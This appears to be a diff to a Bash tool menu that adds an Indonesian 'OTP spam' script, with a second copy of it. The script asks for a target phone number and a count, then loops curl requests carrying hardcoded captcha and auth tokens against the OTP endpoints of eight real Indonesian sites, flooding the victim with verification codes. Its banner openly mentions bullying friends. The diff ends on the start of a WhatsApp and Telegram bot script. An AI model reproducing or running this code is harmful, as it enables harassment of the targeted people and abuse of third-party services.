+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "origin: https://m.misteraladin.com"
+        "sec-fetch-site: same-origin"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://m.misteraladin.com/account"
+        "accept-encoding: gzip, deflate, br"
+    )
+    
+    data5='{"phone_number_country_code":"62","phone_number":"'"$no"'","type":"register"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://m.misteraladin.com/api/members/v2/otp/request" -H "${head5[@]}" -d "$data5")
+        if [[ "$pos" == *"member_id"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 6
+    head6=(
+        "Host: www.carlaclothing.com"
+        "content-length: 1835"
+        "authorization: w8skIDtZ4ZcWL9IE-XFgEEVGSewNVa_YOdC_ytp3T4E.23YAAmXi6UUv5i11BoT4eT982qm6Bz04qcIxc0-5CSE"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "content-type: application/json"
+        "sec-fetch-site: same-origin"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://www.carlaclothing.com/id/login"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data6='{"operationName":"nexus_requestPhoneOtp","variables":{"input":{"subject":"0'"$no"'","taskId":"phone-login","reCAPTCHAToken":"03AFcWeA50_p7g6K-qtW7XSH5tb4oWiJi_xA0wQYnWFaQr-7QgNG04o1B4GpSKQjfguM1jAmDoyL6fwQVhw9xRgFeaW6BazZZbT-FgGbo_YzyOhoC-BS39ge4_dTbjlMcrvDw-m8mINgVMC9jzUW_XBlQlsl8jbA2YdLEEyDHaGmLJ1Vm9YT4AvgOJBjSwF-Rcb1LwObLgSp9l8L4aaGUFuncvJfoec4hXiVFbWJ6mo6cyKEDWSR902dJTYU06MC88wY0ScwasiwE9FNbud4XcX9UlarM4l2Zf3SzQMRLUUOY7xlxbKvc4QK_L147c_YbU2Dy2R3Od1y9_YgXDtXbFuBOXzTwgLWFyzIhmxOcJbA3IBHmOZBf3T15jpHY_J1AItpcKAAPA5bP_89PjQg1YUKlo3y4s3dGea3RDWX8E8oTAcpbIuZZDbl3vMgkUXMCxczjGY9TaDZJM-uDqpmgunC3tPrlB28dW1oAFMlJ1deLoz-OBEupCoikSexFqOEIG2GD8X_qxbfhieDBL2XX4wRNvRk21YbGf2qjAuK7pJgJ9Za8Y7fPApI1VOWaNNbr_ycKL-NeLwg2VkFxP39-Lm_0aN6PmzUHu405STCMHfmnIy2E1WrMX3Ob5oenT2JNACwPgzTHSUfuuP3M3yM7c04SVaXlZFdygqaKcpMO_1Qoaqy03rSyjfNmm7-5cdqC-N3I9YKbZabSwAoQRiRfQh7bYbjuuHP3beZHjeijpwr4MPxPfUUpuUoR9wsp79T8XPqQwwH02W9bJbDVZciVDBRWcpgxguocOr1GUdOQWmqkYdjtQJh0PmkVNWDfF3k0Aoz3rKYB3WgqoVx_Gb7Dd86w3YWE_d3aiHFojIEgf7_RSycSUKEoScvvUgYbKK_Rtf6zAGFyvpstJm2NUHENh3__nGb5J3s4G7Un5Tu0c2xokdWQi7ri4rxsJ67ZgY98612wvrWaB4ZVbfnl1kX1_Nq9E4VF0AZOoY9AGSm1xaBwaF_Id4u15mLqlINfBKVy-f6vwsXck8quSvJaLdrdb0KeRRHnMAwUiyXe2uiKnP9yaf4nRBA0UoPYvVok3SRcMZW9dr6XGW8X6d5XCkNJR4sRtTWFGNiRE9-fnb4YJewTIA7YSkSRSbakmeEOuG5Pr8BGNjmtNuqaXxpl55QUPSSMUAmJuGPBEShY7vHVhUe_dHq2jPjvTWDR2mxOe0bithb19u8uG38g9jFmfG7OJoo4HbqhlojWrDoZuPuR_vbtF3_mqSeXUftM2IJ1UCm-22UEx71Q-AcWwZCMFyaWV_V3Odoq-HCfOzv9MO3yoVIsHAjV5FB9NFFut5QuNg7xHbIzBCcdB7lWKDV1YTP8864aXmdMPCNNSoX2rqWigTqZ_MXZiza5ua0Rp-bIAfJAUhSoKTlrzHyrO8DVSb5trU38CveL4VPhSKDUbFter7ZEPs8G_6hNksK2345elvzwnSxldHa_kcFT-LqG0dk8Jxf4HkTSsw_EIl7JHAwkN8RYNaUU4VE3XeVvMfVqVCLTdle35BFszdkfk"}},"query":"mutation nexus_requestPhoneOtp($input: RequestPhoneOtpInput!) {\n  requestPhoneOtp(input: $input) {\n    validUntil\n    __typename\n  }\n}\n"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://www.carlaclothing.com/graphql" -H "${head6[@]}" -d "$data6")
+        if [[ "$pos" == *"__typename"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELIM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam7
+    head7=(
+        "Host: 3second.co.id"
+        "content-length: 23"
+        "client_id: e26d7fb9-1ed2-431c-a0c1-6155ca5bb6ea"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "content-type: application/json"
+        "accept: application/json"
+        "os: web"
+        "origin: https://3second.co.id"
+        "sec-fetch-site: same-origin"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://3second.co.id/"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data7='{"user":"0'"$no"'"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://3second.co.id/api/member/login/otp" -H "${head7[@]}" -d "$data7")
+        if [[ "$pos" == *"Sukses"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 8
+    head8=(
+        "Host: 807garage.com"
+        "Connection: keep-alive"
+        "Content-Length: 31"
+        "Accept: application/json"
+        "Content-Type: application/json"
+        "Authorization: U2FsdGVkX1+KOJNgL39Mx0cIy16yCeT3KISjDtUclM/wGCXM874CwEEpE/FeQaby/eTLKx7WYvjC9FR0tzSdJByIAHLFlXEF8Re14BMXkJVONeyMC0psyAkaf9LJJRPh6+fmOkEf5LqlDEsWM71r/gWZDYeKcSY7H6cYImW3l3t2IYq5GRoe2ljQAnX79GNljaPOIFP/hPLPnD2WMuhW/XjjsSiAZ6v1OP7mXwq+gpckcDlNrC51k6Kw2aNMSWRM0gtX2LT1KLt7RWe1bjOjR1CKex2R1QQt/JSZMG6EH5LKOkxIUuzGE7kuGVhHiLb17l1nAb5Rv7B0QLuga6nM9tw1AW+tgZEJM/VW9QHo63RIVG7k6VL9aWIApzsrLFRpNFCv9Xg/mnF132/TvcYPp6azNChP6J+O6pyq22TgYslN/wjJOBOSKSqNx1zz0M+uj4hvsZOG/LMNafQpEjiKcKFXAo5PgINgWXgd2z1bV+RmFOhjPfkBjUneV5S7Y6XmQkBwIZrebv90BA+k/BxYs6ynQVwLsqCk7bf/2Wr+e4zr8VhFenuHvXFziFNEwhd5yhqnqr2XowV0iTzxryw9qjJfcV2gS/jKxBmXPwaO+uFwP+FjDkPRzKDfBJtOYQMKaS0omVDzAMKuIzbIpGxIVN7OyE4pf0iYI0NF9HmKQcakvG5EjNK+l3sjAw4za6BiruEVv7TC8iFCpQ5AI8y4EtziGWAKJWYbV4ErYoPjOaywZMJe7dWsLtWhHs1FJZWYmOeafOJ5CR9GasX59dnDTb/Gw5B0pOLABgVXNJH5N0rTM26kRRTd7itUsChOqaIv"
+        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "Origin: https://807garage.com"
+        "Sec-Fetch-Site: same-origin"
+        "Sec-Fetch-Mode: cors"
+        "Sec-Fetch-Dest: empty"
+        "Referer: https://807garage.com/login"
+        "Accept-Encoding: gzip, deflate, br"
+        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data8='{"phone_email":"0'"$no"'"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://807garage.com/api/member/login_reg" -H "${head8[@]}" -d "$data8")
+        if [[ "$pos" == *"Success"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+}
+
+main
+
+# ulang
+sleep 2
+read -p $'\033[0;34mMAU SPAM LAGI KE TARGET?\033[0;32m(y/n) : ' lagi
+
+if [[ "$lagi" == "y" || "$lagi" == "Y" ]]; then
+    clear
+    sleep 2
+    mengetik "$logo"
+    main
+elif [[ "$lagi" == "n" || "$lagi" == "N" ]]; then
+    mengetik "\033[0;36mMAKSI SUDAH MAMPIR TOOLS SPOKYHOZOO 👑"
+    exit
+else
+    exit
+fi
 fi
 
 if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
     # Add your code here for option 6
-    apt update
+    apt update -y 
+    #!/bin/bash
+
+# cybers 2024
+# btw udah follow tiktok chanel gwa belum heheheh
+# izin dulu ya kalo mau record
+# no hp +62 896-6195-6633
+
+logo="
+ 	   kandura-warning     \033[0;32mV.5
+  \033[0;31m
+LORDHOZOO 
+ \033[0;31m
+HOZOO SEDIAKAN SCRIP TOOLS SPAM OTP WA 
+PERINGATAN SPAM HARUS 20 JANGAN BANYAK NANTI HP KAMU ERROR BUG STUK -_-
+"
+
+mengetik() {
+    local s="$1"
+    for ((i=0; i<${#s}; i++)); do
+        printf "%s" "${s:$i:1}"
+        sleep 0.0
+    done
+    printf "\n"
+}
+
+clear
+mengetik "\033[0;34m[+]\033[0;32mFOLLOW TIKTOK chanel gwa dulu YA BRO PLIS FOLLOW"
+xdg-open "https://www.tiktok.com/@virus_umbrela_drakk99999?_t=8k3MdFdfAO1&_r=1" >/dev/null 2>&1
+
+main() {
+    clear
+    mengetik "$logo"
+    mengetik "\033[0;35mHOZOO Tidak bartanggung jawab!!\ngunakan dengan bijak BISA MERUSAK PERTEMENAN ANDA NANTI BULLY 😏"
+    
+    read -p $'\033[0;34mNomor Target : ' no
+    read -p $'\033[0;36mJumlah Spam : ' jum
+    
+    # spam 1
+    head1=(
+        "Host: pulibic-gateway.desty.app"
+        "Connection: keep-alive"
+        "Content-Length: 1758"
+        "local-agent: DestyMenuSeller"
+        "Original-Host: www.desty.app"
+        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "Content-Type: application/json"
+        "Accept: application/json, text/plain, */*"
+        "app: Store"
+        "Origin: https://www.desty.app"
+        "Sec-Fetch-Site: same-site"
+        "Sec-Fetch-Mode: cors"
+        "Sec-Fetch-Dest: empty"
+        "Referer: https://www.desty.app/"
+        "Accept-Encoding: gzip, deflate, br"
+        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data1='{"inputValue":"8'"$no"'","loginType":"Phone","googleCaptcha":"03AFcWeA4ZWRQcky7Gad-85bQtK3JtNRPr11rUKilZZPzmzYRjU7Oh8QA5azUzrIIbvVFidN0LabNr2Qz7udbCbXkg9NpClbF1EhNcD4AkewK-ULaQSNnL9CHUb51D6THZUwe9szeW2NTgCFZEaWNVoBKBGmxVj0dPCil9xOOydXMgoHdgZ5cTm_puq33_KVztay_I2_gNkiKuqMfgDFjWDCpBuKGEfGIjFrW6dNoraoFRLRqVbQUhpo_izJAWCHUsL31jNt6qlwAwGquKwVjmQdMFWElBBcX-bmbkQhBnFJqFDcs1fzaAfUm6HfORuLxxvJNQSEl3cEMsmkkegqQkGXVzquFZUvDBGoc1Qk8m0CqbNZueXNLiBLK82ytSgZCSibhv-KHjXqXwG62zYGREfYhpVzZf1egfR7QkpEd0usEMzY0cD7VqFjCYpu62LCcIqN0DnW99sm_iFN3RJQ_SYJvuV_WTiEEAZ4u_TMMRNV3xQtLEFcPDevYzuELVGq0tBb44PtymTFpyxfBYAs4jlYDd1YTt92n2wOGj-gfbFUD3IbFBt0Il0LBU7PYwSU-lyC7h2IAjVxJJB3rUTqc-ZWiDZQevw6MKJ2y0wWWRXFDI7uhKLNv_0vhMyLPT40UorLgHRyfJY0u2-p3vBGEAuuULe1YsnPPpdEvpoHepQAp9r-x2OZwJgAapFm6ZjMJBohGcnJtBOXPvdg2ePtq3rMxiV9vNHytmDatR6hhZ1vJ8MnamkBNXLUn5edRCkvLwRnNVlwqnnZ4DOmipfMBUAHteNFRw5oKxRmGHN8UfJrmqLK0eAJCjVxwodu4wt3dL_w9wDN9PniJbHEZdnq-PSs40Se1Qc9oti9-Pls4QI13__H9jILpJhzCTHPvwTYYD-JSueoBxAnmTRMUeLoZqd6evM02vpPLKq15ODMxIX4HEG5bMTb41kVP-B5Shs8pNdFdhIXgwJFOy7FKMFPLAIe7KLrLfh5KjEG1swno7LZA8MJuQJYqfEu-lAZgVrrG8VZicbqek00OrPbuDxnA2_V_Zd26xtXm1DXXxcL8n_lQYIIMz6GmIrgVm3DcPko1mKt6ZCq5G4x27U5ksssO8j674w3keKoyCyQBay4VBJZfSNCOvKZHGB1jMyFMHXtP1rEiQny63G5dlVNMaoKwx6ipB1Oxp98N7Kusid8L8A4P5OZ69fyjSNHxojZBS_F5ciw0zVryx5M4tZLijsxs8tbI4aSUr-TVKZXOOHpceo7aMD8xXI-6SvxCupXRGUcmKVP1hF9gGQZKqH6x96TMsykSfS1yM3Vm8hEzPp3aotcTtHUugRIScxS1EbyxWTwEC73JeIrXo_KQTIri61F1U6AigW2Anf1VD2bhzaNWlKd5XArxPqsBleqY0RvyWJhKbV2Rpw3BFpW1oLs89QhsaZTEYg9AYtbXzZhKzWdVOxkN7UAluOSTJNgc7vafs6KNvQF8i6ngarPba5gwewK6qDDn9rYC2W6yuycpH78-8nqLkIAC_WwQJtWI","address":"+62'"$no"'","language":"id","source":"Store","sendType":"WHATSAPP","app":"Store","clientType":1,"situation":"REGISTER"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://pulibic-gateway.desty.app/platform/user/catpcha/send" -H "${head1[@]}" -d "$data1")
+        if [[ "$pos" == *"message"* ]]; then
+            mengetik "\033[0;32m SPAM TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 2
+    head2=(
+        "Host: api.smartseller.co.id"
+        "content-length: 33"
+        "accept: application/json, text/plain, */*"
+        "content-type: application/json"
+        "authorization: Bearer Bearer"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "origin: https://app.smartseller.co.id"
+        "sec-fetch-site: same-site"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://app.smartseller.co.id/"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data2='{"phone_number":"+62'"$no"'"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://api.smartseller.co.id/api/otp/send" -H "${head2[@]}" -d "$data2")
+        if [[ "$pos" == *"Berhasil mengirim OTP"* ]]; then
+            mengetik "\033[0;32mSPAM TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31mBELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 3
+    head3=(
+        "Host: api.bantudagang.com"
+        "content-length: 54"
+        "authorization: Bearer"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "content-type: application/json"
+        "accept: application/json, text/plain, */*"
+        "cache-control: no-cache"
+        "origin: https://app.bantudagang.com"
+        "sec-fetch-site: same-site"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://app.bantudagang.com/"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data3='{"phone_number":"62'"$no"'","from":"registration"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://api.bantudagang.com/auth/request-otp" -H "${head3[@]}" -d "$data3")
+        if [[ "$pos" == *"message"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 4
+    head4=(
+        "Host: www.hitoko.co.id"
+        "content-length: 75"
+        "locale: in_ID"
+        "lazada_ati: 2884070849273"
+        "time-zone: +0700"
+        "content-type: application/json"
+        "accept: application/json, text/plain, */*"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "x-requested-with: XMLHttpRequest"
+        "c: 00"
+        "origin: https://www.hitoko.co.id"
+        "sec-fetch-site: same-origin"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://www.hitoko.co.id/erp/"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: d-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data4='{"phone":"62'"$no"'","sign":"qLBlHpZSVjSp0PNn0uKtEg==","sendType":"01"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://www.hitoko.co.id/erp/api/auth/send-verification-code" -H "${head4[@]}" -d "$data4")
+        if [[ "$pos" == *"desc"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 5
+    head5=(
+        "Host: m.misteraladin.com"
+        "content-length: 81"
+        "accept-language: id"
+        "x-platform: mobile-web"
+        "content-type: application/json"
+        "accept: application/json, text/plain, */*"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "origin: https://m.misteraladin.com"
+        "sec-fetch-site: same-origin"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://m.misteraladin.com/account"
+        "accept-encoding: gzip, deflate, br"
+    )
+    
+    data5='{"phone_number_country_code":"62","phone_number":"'"$no"'","type":"register"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://m.misteraladin.com/api/members/v2/otp/request" -H "${head5[@]}" -d "$data5")
+        if [[ "$pos" == *"member_id"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 6
+    head6=(
+        "Host: www.carlaclothing.com"
+        "content-length: 1835"
+        "authorization: w8skIDtZ4ZcWL9IE-XFgEEVGSewNVa_YOdC_ytp3T4E.23YAAmXi6UUv5i11BoT4eT982qm6Bz04qcIxc0-5CSE"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "content-type: application/json"
+        "sec-fetch-site: same-origin"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://www.carlaclothing.com/id/login"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data6='{"operationName":"nexus_requestPhoneOtp","variables":{"input":{"subject":"0'"$no"'","taskId":"phone-login","reCAPTCHAToken":"03AFcWeA50_p7g6K-qtW7XSH5tb4oWiJi_xA0wQYnWFaQr-7QgNG04o1B4GpSKQjfguM1jAmDoyL6fwQVhw9xRgFeaW6BazZZbT-FgGbo_YzyOhoC-BS39ge4_dTbjlMcrvDw-m8mINgVMC9jzUW_XBlQlsl8jbA2YdLEEyDHaGmLJ1Vm9YT4AvgOJBjSwF-Rcb1LwObLgSp9l8L4aaGUFuncvJfoec4hXiVFbWJ6mo6cyKEDWSR902dJTYU06MC88wY0ScwasiwE9FNbud4XcX9UlarM4l2Zf3SzQMRLUUOY7xlxbKvc4QK_L147c_YbU2Dy2R3Od1y9_YgXDtXbFuBOXzTwgLWFyzIhmxOcJbA3IBHmOZBf3T15jpHY_J1AItpcKAAPA5bP_89PjQg1YUKlo3y4s3dGea3RDWX8E8oTAcpbIuZZDbl3vMgkUXMCxczjGY9TaDZJM-uDqpmgunC3tPrlB28dW1oAFMlJ1deLoz-OBEupCoikSexFqOEIG2GD8X_qxbfhieDBL2XX4wRNvRk21YbGf2qjAuK7pJgJ9Za8Y7fPApI1VOWaNNbr_ycKL-NeLwg2VkFxP39-Lm_0aN6PmzUHu405STCMHfmnIy2E1WrMX3Ob5oenT2JNACwPgzTHSUfuuP3M3yM7c04SVaXlZFdygqaKcpMO_1Qoaqy03rSyjfNmm7-5cdqC-N3I9YKbZabSwAoQRiRfQh7bYbjuuHP3beZHjeijpwr4MPxPfUUpuUoR9wsp79T8XPqQwwH02W9bJbDVZciVDBRWcpgxguocOr1GUdOQWmqkYdjtQJh0PmkVNWDfF3k0Aoz3rKYB3WgqoVx_Gb7Dd86w3YWE_d3aiHFojIEgf7_RSycSUKEoScvvUgYbKK_Rtf6zAGFyvpstJm2NUHENh3__nGb5J3s4G7Un5Tu0c2xokdWQi7ri4rxsJ67ZgY98612wvrWaB4ZVbfnl1kX1_Nq9E4VF0AZOoY9AGSm1xaBwaF_Id4u15mLqlINfBKVy-f6vwsXck8quSvJaLdrdb0KeRRHnMAwUiyXe2uiKnP9yaf4nRBA0UoPYvVok3SRcMZW9dr6XGW8X6d5XCkNJR4sRtTWFGNiRE9-fnb4YJewTIA7YSkSRSbakmeEOuG5Pr8BGNjmtNuqaXxpl55QUPSSMUAmJuGPBEShY7vHVhUe_dHq2jPjvTWDR2mxOe0bithb19u8uG38g9jFmfG7OJoo4HbqhlojWrDoZuPuR_vbtF3_mqSeXUftM2IJ1UCm-22UEx71Q-AcWwZCMFyaWV_V3Odoq-HCfOzv9MO3yoVIsHAjV5FB9NFFut5QuNg7xHbIzBCcdB7lWKDV1YTP8864aXmdMPCNNSoX2rqWigTqZ_MXZiza5ua0Rp-bIAfJAUhSoKTlrzHyrO8DVSb5trU38CveL4VPhSKDUbFter7ZEPs8G_6hNksK2345elvzwnSxldHa_kcFT-LqG0dk8Jxf4HkTSsw_EIl7JHAwkN8RYNaUU4VE3XeVvMfVqVCLTdle35BFszdkfk"}},"query":"mutation nexus_requestPhoneOtp($input: RequestPhoneOtpInput!) {\n  requestPhoneOtp(input: $input) {\n    validUntil\n    __typename\n  }\n}\n"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://www.carlaclothing.com/graphql" -H "${head6[@]}" -d "$data6")
+        if [[ "$pos" == *"__typename"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELIM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam7
+    head7=(
+        "Host: 3second.co.id"
+        "content-length: 23"
+        "client_id: e26d7fb9-1ed2-431c-a0c1-6155ca5bb6ea"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "content-type: application/json"
+        "accept: application/json"
+        "os: web"
+        "origin: https://3second.co.id"
+        "sec-fetch-site: same-origin"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://3second.co.id/"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data7='{"user":"0'"$no"'"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://3second.co.id/api/member/login/otp" -H "${head7[@]}" -d "$data7")
+        if [[ "$pos" == *"Sukses"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 8
+    head8=(
+        "Host: 807garage.com"
+        "Connection: keep-alive"
+        "Content-Length: 31"
+        "Accept: application/json"
+        "Content-Type: application/json"
+        "Authorization: U2FsdGVkX1+KOJNgL39Mx0cIy16yCeT3KISjDtUclM/wGCXM874CwEEpE/FeQaby/eTLKx7WYvjC9FR0tzSdJByIAHLFlXEF8Re14BMXkJVONeyMC0psyAkaf9LJJRPh6+fmOkEf5LqlDEsWM71r/gWZDYeKcSY7H6cYImW3l3t2IYq5GRoe2ljQAnX79GNljaPOIFP/hPLPnD2WMuhW/XjjsSiAZ6v1OP7mXwq+gpckcDlNrC51k6Kw2aNMSWRM0gtX2LT1KLt7RWe1bjOjR1CKex2R1QQt/JSZMG6EH5LKOkxIUuzGE7kuGVhHiLb17l1nAb5Rv7B0QLuga6nM9tw1AW+tgZEJM/VW9QHo63RIVG7k6VL9aWIApzsrLFRpNFCv9Xg/mnF132/TvcYPp6azNChP6J+O6pyq22TgYslN/wjJOBOSKSqNx1zz0M+uj4hvsZOG/LMNafQpEjiKcKFXAo5PgINgWXgd2z1bV+RmFOhjPfkBjUneV5S7Y6XmQkBwIZrebv90BA+k/BxYs6ynQVwLsqCk7bf/2Wr+e4zr8VhFenuHvXFziFNEwhd5yhqnqr2XowV0iTzxryw9qjJfcV2gS/jKxBmXPwaO+uFwP+FjDkPRzKDfBJtOYQMKaS0omVDzAMKuIzbIpGxIVN7OyE4pf0iYI0NF9HmKQcakvG5EjNK+l3sjAw4za6BiruEVv7TC8iFCpQ5AI8y4EtziGWAKJWYbV4ErYoPjOaywZMJe7dWsLtWhHs1FJZWYmOeafOJ5CR9GasX59dnDTb/Gw5B0pOLABgVXNJH5N0rTM26kRRTd7itUsChOqaIv"
+        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "Origin: https://807garage.com"
+        "Sec-Fetch-Site: same-origin"
+        "Sec-Fetch-Mode: cors"
+        "Sec-Fetch-Dest: empty"
+        "Referer: https://807garage.com/login"
+        "Accept-Encoding: gzip, deflate, br"
+        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data8='{"phone_email":"0'"$no"'"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://807garage.com/api/member/login_reg" -H "${head8[@]}" -d "$data8")
+        if [[ "$pos" == *"Success"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+}
+
+main
+
+# ulang
+sleep 2
+read -p $'\033[0;34mMAU SPAM LAGI KE TARGET?\033[0;32m(y/n) : ' lagi
+
+if [[ "$lagi" == "y" || "$lagi" == "Y" ]]; then
+    clear
+    sleep 2
+    mengetik "$logo"
+    main
+elif [[ "$lagi" == "n" || "$lagi" == "N" ]]; then
+    mengetik "\033[0;36mMAKSI SUDAH MAMPIR TOOLS SPOKYHOZOO 👑"
+    exit
+else
+    exit
+fi
 fi
 
 if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
     # Add your code here for option 7
     apt update -y 
+    
     #!/bin/bash
 
 # Creator :  Asasin Hack
@@ -825,7 +1724,158 @@ fi
 
 if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
     # Add your code here for option 8
-    apt update
+    apt update -y
+    const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
+const pino = require('pino');
+const readline = require("readline");
+const TelegramBot = require('node-telegram-bot-api');
+
+// Color configurations
+const colors = {
+    red: '\x1b[31m',
+    green: '\x1b[32m',
+    yellow: '\x1b[33m',
+    blue: '\x1b[34m',
+    magenta: '\x1b[35m',
+    cyan: '\x1b[36m',
+    reset: '\x1b[0m'
+};
+
+const randomColor = () => {
+    const colorKeys = Object.keys(colors).filter(key => key !== 'reset');
+    return colors[colorKeys[Math.floor(Math.random() * colorKeys.length)]];
+};
+
+const currentColor = randomColor();
+
+// Telegram Bot Setup
+let telegramBot;
+const telegramToken = process.env.TELEGRAM_TOKEN || '';
+const chatId = process.env.CHAT_ID || '';
+
+// Question interface
+const question = (text) => {
+    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+    return new Promise((resolve) => { rl.question(text, resolve) });
+};
+
+// Initialize Telegram Bot
+function initTelegramBot() {
+    if (!telegramToken) {
+        console.log(currentColor + 'Telegram bot token not provided. Some features will be disabled.' + colors.reset);
+        return;
+    }
+
+    telegramBot = new TelegramBot(telegramToken, { polling: true });
+
+    telegramBot.on('message', (msg) => {
+        const chatId = msg.chat.id;
